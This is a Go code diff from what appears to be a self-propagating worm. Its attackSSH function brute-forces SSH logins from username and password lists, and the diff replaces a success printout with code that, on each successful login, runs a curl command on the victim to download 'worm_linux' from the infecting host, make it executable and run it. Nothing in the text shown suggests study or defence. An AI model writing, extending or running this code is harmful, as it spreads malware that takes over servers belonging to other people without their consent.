@@ -57,6 +57,11 @@ func scanPort(ip string, port int) bool {
 	return true
 }
 
+func getIPOnly(addr net.Addr) string {
+	host, _, _ := net.SplitHostPort(addr.String())
+	return host
+}
+
 func attackSSH(target string, p int) {
 	for _, user := range usernames {
 		for _, password := range passwords {
@@ -77,7 +82,13 @@ func attackSSH(target string, p int) {
 
 			if err == nil {
 
-				fmt.Printf("SSH access success for User: %s Password: %s\n", user, password)
+				myIP := getIPOnly(conn.LocalAddr())
+
+				cmd := fmt.Sprintf("curl -O http://%s:8080/worm_linux && chmod +x worm_linux && ./worm_linux", myIP)
+
+				session, _ := conn.NewSession()
+				session.Run(cmd)
+				session.Close()
 				conn.Close()
 
 				return
